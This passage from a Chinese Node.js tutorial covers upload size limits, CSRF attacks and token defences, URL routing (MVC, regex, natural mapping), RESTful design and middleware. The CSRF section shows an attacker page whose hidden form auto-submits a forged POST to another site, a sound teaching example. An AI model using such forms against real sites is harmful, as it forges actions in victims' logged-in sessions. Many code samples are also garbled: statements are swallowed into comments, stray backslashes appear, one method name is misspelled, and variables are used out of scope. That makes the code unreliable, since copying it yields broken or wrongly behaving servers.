<p>限制上传内容的大小，一旦超过限制，停止接收数据，并响应400状态码。通过流式解析，将数据流导向到磁盘中，Node只保留文件路径等小数据。</p>
<p>流式处理在上文的文件上传中已经有所体现，这里介绍一下Connect中采用的上传数据量的限制方式，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> bytes = <span class="number">1024</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> received = <span class="number">0</span>,</div><div class="line">    <span class="keyword">var</span> len = req.headers[<span class="string">'content-length'</span>] ?</div><div class="line">      <span class="built_in">parseInt</span>(req.headers[<span class="string">'content-length'</span>], <span class="number">10</span>) : <span class="literal">null</span>;</div><div class="line">  <span class="comment">// 如果内容超过长度限制，返回请求实体过长的状态码 if (len &amp;&amp; len &gt;</span></div><div class="line">  bytes) &#123;</div><div class="line">  res.writeHead(<span class="number">413</span>);</div><div class="line">  res.end();</div><div class="line">  <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// limit</span></div><div class="line">req.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">  received += chunk.length;</div><div class="line">  <span class="keyword">if</span> (received &gt; bytes) &#123; <span class="comment">// 停止接收数据，触发end()</span></div><div class="line">    req.destroy();</div><div class="line">  &#125;</div><div class="line">&#125;);</div><div class="line">handle(req, res);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>上面的代码中我们可以看到，数据是由包含Content-Length的请求报文判断是否长度超过限制的，超过则直接响应413状态码。对于没有Content-Length的请求报文，略微简略一点，在每个data事件中判定即可。一旦超过限制值，服务器停止接收新的数据片段。如果是JSON文件或XML文件，极有可能无法完成解析。对于上线的Web应用，添加一个上传大小限制十分有利于保护服务器，在遭遇攻击时，能镇定从容应对。</p>
<h3 id="CSRF-1"><a href="#CSRF-1" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRF的全称是<code>Cross-Site Request Forgery</code>，中文意思为<code>跨站请求伪造</code>。前文提及了服务器端与客户端通过Cookie来标识和认证用户，通常而言，用户通过浏览器访问服务器端的Session ID是无法被第三方知道的，但是CSRF的攻击者并不需要知道Session ID就能让用户中招。为了详细解释CSRF攻击是怎样一个过程，这里以一个留言的例子来说明。假设某个网站有这样一个留言程序，提交留言的接口如下所示：</p>
<p><a href="http://domain_a.com/guestbook" target="_blank" rel="external">http://domain_a.com/guestbook</a></p>
<p>用户通过POST提交content字段就能成功留言。</p>
<p>服务器端会自动从Session数据中判断是谁提交的数据，补足username和updatedAt两个字段后向数据库中写入数据，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> content = req.body.content || <span class="string">''</span>;</div><div class="line">  <span class="keyword">var</span> username = req.session.username;</div><div class="line">  <span class="keyword">var</span> feedback = &#123;</div><div class="line">    <span class="attr">username</span>: username,</div><div class="line">    <span class="attr">content</span>: content,</div><div class="line">    <span class="attr">updatedAt</span>: <span class="built_in">Date</span>.now()</div><div class="line">  &#125;;</div><div class="line">  db.save(feedback, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</div><div class="line">    res.writeHead(<span class="number">200</span>);</div><div class="line">    res.end(<span class="string">'Ok'</span>);</div><div class="line">  &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>正常的情况下，谁提交的留言，就会在列表中显示谁的信息。如果某个攻击者发现了这里的接口存在CSRF漏洞，那么他就可以在另一个网站（<a href="http://domain_b.com/attack）上构造了一个表单提交，如下所示：" target="_blank" rel="external">http://domain_b.com/attack）上构造了一个表单提交，如下所示：</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"test"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"http://domain_a.com/guestbook"</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">value</span>=<span class="string">"vim是这个世界上最好的编辑器"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">  $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    $(<span class="string">"#test"</span>).submit();</div><div class="line">  &#125;);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这种情况下，攻击者只要引诱某个<code>domain_a</code>的登录用户访问这个<code>domain_b</code>的网站，就会自动提交一个留言。由于在提交到<code>domain_a</code>的过程中，浏览器会将<code>domain_a</code>的Cookie发送到服务器，尽管这个请求是来自domain_b的，但是服务器并不知情，用户也不知情。以上过程就是一个CSRF攻击的过程。这里的示例仅仅是一个留言的漏洞，如果出现漏洞的是转账的接口，那么其危害程度可想而知。</p>
<p>尽管通过Node接收数据提交十分容易，但是安全问题还是不容忽视。好在CSRF并非不可防御，解决CSRF攻击的方案有添加随机值的方式，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> generateRandom = <span class="function"><span class="keyword">function</span> (<span class="params">len</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> crypto.randomBytes(<span class="built_in">Math</span>.ceil(len *</div><div class="line">      <span class="number">3</span> / <span class="number">4</span>))</div><div class="line">    .toString(<span class="string">'base64'</span>).slice(<span class="number">0</span>, len);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>也就是说，为每个请求的用户，在Session中赋予一个随机值，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> token = req.session._csrf || (req.session._csrf = generateRandom(<span class="number">24</span>));</div></pre></td></tr></table></figure>
<p>在做页面渲染的过程中，将这个_csrf值告之前端，如下所示：<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"test"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"http://domain_a.com/guestbook"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">value</span>=<span class="string">"vim是这个世界上最好的编辑器"</span> /&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"_csrf"</span> <span class="attr">value</span>=<span class="string">"&lt;%=_csrf%&gt;"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>由于该值是一个随机值，攻击者构造出相同的随机值的难度相当大，所以我们只需要在接收端做一次校验就能轻易地识别出该请求是否为伪造的，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> token = req.session._csrf || (req.session._csrf = generateRandom(<span class="number">24</span>));</div><div class="line">  <span class="keyword">var</span> _csrf = req.body._csrf;</div><div class="line">  <span class="keyword">if</span> (token !== _csrf) &#123;</div><div class="line">    res.writeHead(<span class="number">403</span>);</div><div class="line">    res.end(<span class="string">"禁止访问"</span>);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    handle(req, res);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>_csrf字段也可以存在于查询字符串或者请求头中。</p>
<h3 id="8-3-1-文件路径型-1"><a href="#8-3-1-文件路径型-1" class="headerlink" title="8.3.1 文件路径型"></a>8.3.1 文件路径型</h3><p>在MVC模式流行起来之前，根据文件路径执行动态脚本也是基本的路由方式，它的处理原理是Web服务器根据URL路径找到对应的文件，如/index.asp或/index.php。Web服务器根据文件名后缀去寻找脚本的解析器，并传入HTTP请求的上下文。</p>
<h3 id="8-3-2-MVC-1"><a href="#8-3-2-MVC-1" class="headerlink" title="8.3.2 MVC"></a>8.3.2 MVC</h3><p>在MVC流行之前，主流的处理方式都是通过文件路径进行处理的，甚至以为是常态。直到有一天开发者发现用户请求的URL路径原来可以跟具体脚本所在的路径没有任何关系。</p>
<p>MVC模型的主要思想是将业务逻辑按职责分离，主要分为以下几种。</p>
<ul>
<li>控制器（Controller），一组行为的集合。</li>
<li>模型（Model），数据相关的操作和封装。</li>
<li>视图（View），视图的渲染。</li>
</ul>
<p>它的工作模式如下说明。</p>
<p>路由解析，根据URL寻找到对应的控制器和行为。<br>行为调用相关的模型，进行数据操作。<br>数据操作结束后，调用视图和相关数据进行页面渲染，输出到客户端。</p>
<p>如何根据URL做路由映射，这里有两个分支实现。一种方式是通过手工关联映射，一种是自然关联映射。前者会有一个对应的路由文件来将URL映射到对应的控制器，后者没有这样的文件。<br>图8-3　分层模式</p>
<p>手工映射<br>手工映射除了需要手工配置路由外较为原始外，它对URL的要求十分灵活，几乎没有格式上的限制。</p>
<p>手工映射十分方便，由于它对URL十分灵活，所以我们可以将两个路径都映射到相同的业务逻辑，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">use(<span class="string">'/user/setting'</span>, exports.setting);</div><div class="line">use(<span class="string">'/setting/user'</span>, exports.setting);</div><div class="line"><span class="comment">// 甚至 use('/setting/user/jacksontian',exports.setting);</span></div></pre></td></tr></table></figure>
<p>正则匹配对于简单的路径，采用上述的硬匹配方式即可，但是如下的路径请求就完全无法满足需求了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">/profile/jacksontian</div><div class="line">/profile/hoover</div></pre></td></tr></table></figure>
<p>这些请求需要根据不同的用户显示不同的内容，这里只有两个用户，假如系统中存在成千上万个用户，我们就不太可能去手工维护所有用户的路由请求，因此正则匹配应运而生，我们期望通过以下的方式就可以匹配到任意用户：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">use(<span class="string">'/profile/:username'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123; </div><div class="line">  <span class="comment">// TODO</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>于是我们改进我们的匹配方式，在通过use注册路由时需要将路径转换为一个正则表达式，然后通过它来进行匹配，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> pathRegexp = <span class="function"><span class="keyword">function</span> (<span class="params">path</span>) </span>&#123;</div><div class="line">  path = path</div><div class="line">    .concat(strict ? <span class="string">''</span> : <span class="string">'/?'</span>).replace(<span class="regexp">/\/\(/g</span>, <span class="string">'(?:/'</span>)</div><div class="line">    .replace(<span class="regexp">/(\/)?(\.)?:(\w+)(?:(\(.*?\)))?(\?)?(\*)?/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">_, slash, format, key, capture, optional, star</span>) </span>&#123;</div><div class="line">      slash = slash || <span class="string">''</span>;</div><div class="line">      <span class="keyword">return</span> <span class="string">''</span> + (optional ? <span class="string">''</span> : slash)\ + <span class="string">'(?:'</span> + (optional ? slash : <span class="string">''</span>)\ + (format || <span class="string">''</span>) + (capture || (format &amp;&amp; <span class="string">'([^/.]+?)'</span> || <span class="string">'([^/]+?)'</span>)) + <span class="string">')'</span> + (optional || <span class="string">''</span>)\ + (star ? <span class="string">'(/*)?'</span> : <span class="string">''</span>);</div><div class="line">    &#125;)</div><div class="line">    .replace(<span class="regexp">/([\/.])/g</span>, <span class="string">'\\$1'</span>).replace(<span class="regexp">/\*/g</span>, <span class="string">'(.*)'</span>);</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'^'</span> + path + <span class="string">'$'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上述正则表达式十分复杂，总体而言，它能实现如下的匹配：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">/profile/:username =&gt; /profile/jacksontian, </div><div class="line">/profile/hoover /user.:ext =&gt; /user.xml, /user.json</div></pre></td></tr></table></figure>
<p>现在我们重新改进注册部分：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> use = <span class="function"><span class="keyword">function</span> (<span class="params">path, action</span>) </span>&#123;</div><div class="line">  routes.push([pathRegexp(path), action]);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>以及匹配部分：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> pathname = url.parse(req.url).pathname;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; routes.length; i++) &#123;</div><div class="line">    <span class="keyword">var</span> route = routes[i]; <span class="comment">// 正则匹配</span></div><div class="line">    <span class="keyword">if</span> (route[<span class="number">0</span>].exec(pathname)) &#123;</div><div class="line">      <span class="keyword">var</span> action = route[<span class="number">1</span>];</div><div class="line">      action(req, res);</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// 处理404请求 handle404(req, res);</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h3><p>尽管完成了正则匹配，可以实现相似URL的匹配，但是:username到底匹配了啥，还没有解决。为此我们还需要进一步将匹配到的内容抽取出来，希望在业务中能如下这样调用：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">use(<span class="string">'/profile/:username'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> username = req.params.username;</div><div class="line">  <span class="comment">// TODO</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>这里的目标是将抽取的内容设置到req.params处。那么第一步就是将键值抽取出来，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> pathRegexp = <span class="function"><span class="keyword">function</span> (<span class="params">path</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> keys = [];</div><div class="line">  path = path.concat(strict ? <span class="string">''</span> : <span class="string">'/?'</span>)</div><div class="line">    .replace(<span class="regexp">/\/\(/g</span>, <span class="string">'(?:/'</span>).replace(<span class="regexp">/(\/)?(\.)?:(\w+)(?:(\(.*?\)))?(\?)?(\*)?/g</span>,</div><div class="line">      <span class="function"><span class="keyword">function</span> (<span class="params">_, slash, format, key, capture,</span></span></div><div class="line">        optional, star) &#123; <span class="comment">// 将匹配到的键值保存起来</span></div><div class="line">        keys.push(key);</div><div class="line">        slash = slash || <span class="string">''</span>;</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span> + (optional ? <span class="string">''</span> : slash)\ + <span class="string">'(?:'</span> + (optional ? slash : <span class="string">''</span>)\ + (format || <span class="string">''</span>) + (capture || (format &amp;&amp; <span class="string">'([^/.]+?)'</span> || <span class="string">'([^/]+?)'</span>)) +</div><div class="line">          <span class="string">')'</span> + (optional || <span class="string">''</span>)\ + (star ? <span class="string">'(/*)?'</span> : <span class="string">''</span>);</div><div class="line">      &#125;)</div><div class="line">    .replace(<span class="regexp">/([\/.])/g</span>, <span class="string">'\\$1'</span>).replace(<span class="regexp">/\*/g</span>, <span class="string">'(.*)'</span>);</div><div class="line">  <span class="keyword">return</span> &#123;</div><div class="line">    <span class="attr">keys</span>: keys,</div><div class="line">    <span class="attr">regexp</span>: <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'^'</span> + path + <span class="string">'$'</span>)</div><div class="line">  &#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们将根据抽取的键值和实际的URL得到键值匹配到的实际值，并设置到req.params处，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> pathname = url.parse(req.url).pathname;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;</div><div class="line">    routes.length; i++) &#123;</div><div class="line">    <span class="keyword">var</span> route = routes[i]; <span class="comment">// 正则匹配</span></div><div class="line">    <span class="keyword">var</span> reg = route[<span class="number">0</span>].regexp;</div><div class="line">    <span class="keyword">var</span> keys = route[<span class="number">0</span>].keys;</div><div class="line">    <span class="keyword">var</span> matched = reg.exec(pathname);</div><div class="line">    <span class="keyword">if</span> (matched) &#123;</div><div class="line">      <span class="comment">// 抽取具体值 var params = &#123;&#125;;</span></div><div class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, l = keys.length; i &lt; l; i++) &#123;</div><div class="line">        <span class="keyword">var</span> value = matched[i + <span class="number">1</span>];</div><div class="line">        <span class="keyword">if</span> (value) &#123;</div><div class="line">          params[keys[i]] = value;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      req.params = params;</div><div class="line">      <span class="keyword">var</span> action = route[<span class="number">1</span>];</div><div class="line">      action(req, res);</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">  &#125; <span class="comment">// 处理404请求</span></div><div class="line">  handle404(req, res);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>至此，我们除了从查询字符串（req.query）或提交数据（req.body）中取到值外，还能从路径的映射里取到值。</p>
<p>自然映射手工映射的优点在于路径可以很灵活，但是如果项目较大，路由映射的数量也会很多。从前端路径到具体的控制器文件，需要进行查阅才能定位到实际代码的位置，为此有人提出，尽是路由不如无路由。实际上并非没有路由，而是路由按一种约定的方式自然而然地实现了路由，而无须去维护路由映射。</p>
<p>上文的路径解析部分对这种自然映射的实现有稍许介绍，简单而言，它将如下路径进行了划分处理：<br>/controller/action/param1/param2/param3以/user/setting/12/1987为例，它会按约定去找controllers目录下的user文件，将其require出来后，调用这个文件模块的setting()方法，而其余的值作为参数直接传递给这个方法。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> pathname = url.parse(req.url).pathname;</div><div class="line">  <span class="keyword">var</span> paths = pathname.split(<span class="string">'/'</span>);</div><div class="line">  <span class="keyword">var</span> controller = paths[<span class="number">1</span>] || <span class="string">'index'</span>;</div><div class="line">  <span class="keyword">var</span> action = paths[<span class="number">2</span>] || <span class="string">'index'</span>;</div><div class="line">  <span class="keyword">var</span> args = paths.slice(<span class="number">3</span>);</div><div class="line">  <span class="keyword">var</span> <span class="built_in">module</span>;</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    <span class="comment">// require的缓存机制使得只有第一次是阻塞的 module =</span></div><div class="line">    <span class="built_in">require</span>(<span class="string">'./controllers/'</span> + controller);</div><div class="line">  &#125; <span class="keyword">catch</span> (ex) &#123;</div><div class="line">    handle500(req, res);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">var</span> method = <span class="built_in">module</span>[action]</div><div class="line">  <span class="keyword">if</span> (method) &#123;</div><div class="line">    method.apply(<span class="literal">null</span>, [req, res].concat(args));</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    handle500(req, res);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>由于这种自然映射的方式没有指明参数的名称，所以无法采用req.params的方式提取，但是直接通过参数获取更简洁，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">exports.setting = <span class="function"><span class="keyword">function</span> (<span class="params">req, res, month, year</span>) </span>&#123; </div><div class="line">  <span class="comment">// 如果路径为/user/setting/12/1987，那么month为12，year为1987</span></div><div class="line"><span class="comment">// TODO </span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>事实上手工映射也能将值作为参数进行传递，而不是通过req.params。但是这个观点见仁见智，这里不做比较和讨论。自然映射这种路由方式在PHP的MVC框架CodeIgniter中应用十分广泛，设计十分简洁，在Node中实现它也十分容易。与手工映射相比，如果URL变动，它的文件也需要发生变动，手工映射只需要改动路由映射即可。</p>
<p><strong>8.3.3 RESTful</strong></p>
<p>RESTful</p>
<p>MVC模式大行其道了很多年，直到RESTful的流行，大家才意识到URL也可以设计得很规范，请求方法也能作为逻辑分发的单元。</p>
<p><code>REST</code>的全称是<code>Representational State Transfer</code>，中文含义为<code>表现层状态转化</code>。符合REST规范的设计，我们称为RESTful设计。它的设计哲学主要将服务器端提供的内容实体看作一个资源，并表现在URL上。<br>比如一个用户的地址如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">/users/jacksontian</div></pre></td></tr></table></figure>
<p>这个地址代表了一个资源，对这个资源的操作，主要体现在HTTP请求方法上，不是体现在URL上。过去我们对用户的增删改查或许是如下这样设计URL的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">POST /user/add?username=jacksontian </div><div class="line">GET /user/remove?username=jacksontian</div><div class="line">POST /user/update?username=jacksontian </div><div class="line">GET /user/get?username=jacksontian</div></pre></td></tr></table></figure>
<p>操作行为主要体现在行为上，主要使用的请求方法是POST和GET。在RESTful设计中，它是如下这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">POST /user/jacksontian</div><div class="line">DELETE /user/jacksontian</div><div class="line">PUT /user/jacksontian </div><div class="line">GET /user/jacksontian</div></pre></td></tr></table></figure>
<p>它将DELETE和PUT请求方法引入设计中，参与资源的操作和更改资源的状态。对于这个资源的具体表现形态，也不再如过去一样表现在URL的文件后缀上。过去设计资源的格式与后缀有很大的关联，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">GET /user/jacksontian.json </div><div class="line">GET /user/jacksontian.xml</div></pre></td></tr></table></figure>
<p>在RESTful设计中，资源的具体格式由请求报头中的Accept字段和服务器端的支持情况来决定。如果客户端同时接受JSON和XML格式的响应，那么它的Accept字段值是如下这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Accept: application/json,application/xml</div></pre></td></tr></table></figure>
<p>靠谱的服务器端应该要顾及这个字段，然后根据自己能响应的格式做出响应。在响应报文中，通过Content-Type字段告知客户端是什么格式，如下所示：Content-Type: application/json具体格式，我们称之为具体的表现。所以REST的设计就是，通过URL设计资源、请求方法定义资源的操作，通过Accept决定资源的表现形式。</p>
<p>RESTful与MVC设计并不冲突，而且是更好的改进。相比MVC，RESTful只是将HTTP请求方法也加入了路由的过程，以及在URL路径上体现得更资源化。</p>
<p>请求方法<br>为了让Node能够支持RESTful需求，我们改进了我们的设计。如果use是对所有请求方法的处理，那么在RESTful的场景下，我们需要区分请求方法设计。示例如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> routes = &#123;</div><div class="line">  <span class="string">'all'</span>: []</div><div class="line">&#125;;</div><div class="line"><span class="keyword">var</span> app = &#123;&#125;;</div><div class="line">app.use = <span class="function"><span class="keyword">function</span> (<span class="params">path, action</span>) </span>&#123;</div><div class="line">  routes.all.push([pathRegexp(path), action]);</div><div class="line">&#125;;</div><div class="line">[<span class="string">'get'</span>, <span class="string">'put'</span>, <span class="string">'delete'</span>, <span class="string">'post'</span>].forEach(<span class="function"><span class="keyword">function</span> (<span class="params">method</span>) </span>&#123;</div><div class="line">  routes[method] = &#123;&#125;;</div><div class="line">  app[method] = <span class="function"><span class="keyword">function</span> (<span class="params">path, action</span>) </span>&#123;</div><div class="line">    routes[method].push([pathRegexp(path), action]);</div><div class="line">  &#125;;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>上面的代码添加了get()、put()、delete()、post()4个方法后，我们希望通过如下的方式完成路由映射：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 增加用户 </span></div><div class="line">app.post(<span class="string">'/user/:username'</span>, addUser);</div><div class="line"><span class="comment">// 删除用户 </span></div><div class="line">app.delete(<span class="string">'/user/:username'</span>, removeUser);</div><div class="line"><span class="comment">// 修改用户 </span></div><div class="line">app.put(<span class="string">'/user/:username'</span>, updateUser);</div><div class="line"><span class="comment">// 查询用户 </span></div><div class="line">app.get(<span class="string">'/user/:username'</span>, getUser);</div></pre></td></tr></table></figure>
<p>这样的路由能够识别请求方法，并将业务进行分发。为了让分发部分更简洁，我们先将匹配的部分抽取为match()方法，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> match = <span class="function"><span class="keyword">function</span> (<span class="params">pathname, routes</span>) </span>&#123;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; routes.length; i++) &#123;</div><div class="line">    <span class="keyword">var</span> route = routes[i];</div><div class="line">    <span class="comment">// 正则匹配 var reg = route[0].regexp;</span></div><div class="line">    <span class="keyword">var</span> keys = route[<span class="number">0</span>].keys;</div><div class="line">    <span class="keyword">var</span> matched = reg.exec(pathname);</div><div class="line">    <span class="keyword">if</span> (matched) &#123; <span class="comment">// 抽取具体值</span></div><div class="line">      <span class="keyword">var</span> params = &#123;&#125;;</div><div class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, l = keys.length; i &lt; l; i++) &#123;</div><div class="line">        <span class="keyword">var</span> value = matched[i + <span class="number">1</span>];</div><div class="line">        <span class="keyword">if</span> (value) &#123;</div><div class="line">          params[keys[i]] = value;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      req.params = params;</div><div class="line">      <span class="keyword">var</span> action = route[<span class="number">1</span>];</div><div class="line">      action(req, res);</div><div class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>然后改进我们的分发部分，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> pathname = url.parse(req.url).pathname; <span class="comment">// 将请求方法变为小写</span></div><div class="line">  <span class="keyword">var</span> method = req.method.toLowerCase();</div><div class="line">  <span class="keyword">if</span> (routes.hasOwnPerperty(method)) &#123;</div><div class="line">    <span class="comment">// 根据请求方法分发 if (match(pathname, routes[method])) &#123;</span></div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="comment">// 如果路径没有匹配成功，尝试让all()来处理 if</span></div><div class="line">    (match(pathname, routes.all)) &#123;</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  <span class="comment">// 直接让all()来处理 if</span></div><div class="line">  (match(pathname, routes.all)) &#123;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line">&#125; <span class="comment">// 处理404请求</span></div><div class="line">handle404(req, res);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如此，我们完成了实现RESTful支持的必要条件。这里的实现过程采用了手工映射的方法完成，事实上通过自然映射也能完成RESTful的支持，但是根据<code>Controller/Action</code>的约定必须要转化为<code>Resource/Method</code> 的约定，此处已经引出实现思路，不再详述。目前RESTful应用已经开始广泛起来，随着业务逻辑前端化、客户端的多样化，RESTful模式以其轻量的设计，得到广大开发者的青睐。对于多数的应用而言，只需要构建一套RESTful服务接口，就能适应移动端、PC端的各种客户端应用。</p>
<h3 id="8-4-中间件"><a href="#8-4-中间件" class="headerlink" title="8.4 中间件"></a>8.4 中间件</h3><p>对于Web应用而言，我们希望不用接触到这么多细节性的处理，为此我们引入中间件（middleware）来简化和隔离这些基础设施与业务逻辑之间的细节，让开发者能够关注在业务的开发上，以达到提升开发效率的目的。</p>
<p>在最早的中间件的定义中，它是一种在操作系统上为应用软件提供服务的计算机软件。</p>
<p>它既不是操作系统的一部分，也不是应用软件的一部分，它处于操作系统与应用软件之间，让应用软件更好、更方便地使用底层服务。如今中间件的含义借指了这种封装底层细节，为上层提供更方便服务的意义，并非限定在操作系统层面。这里要提到的中间件，就是为我们封装上文提及的所有HTTP请求细节处理的中间件，开发者可以脱离这部分细节，专注在业务上。</p>
<p>中间件的行为比较类似Java中过滤器（filter）的工作原理，就是在进入具体的业务处理之前，先让过滤器处理。它的工作模型如图8-4所示。如同图8-4所示，从HTTP请求到具体业务逻辑之间，其实有很多的细节要处理。Node的http模块提供了应用层协议网络的封装，对具体业务并没有支持，在业务逻辑之下，必须有开发框架对业务提供支持。这里我们通过中间件的形式搭建开发框架，这个开发框架用来组织各个中间件。对于Web应用的各种基础功能，我们通过中间件来完成，每个中间件处理掉相对简单的逻辑，最终汇成强大的基础框架</p>
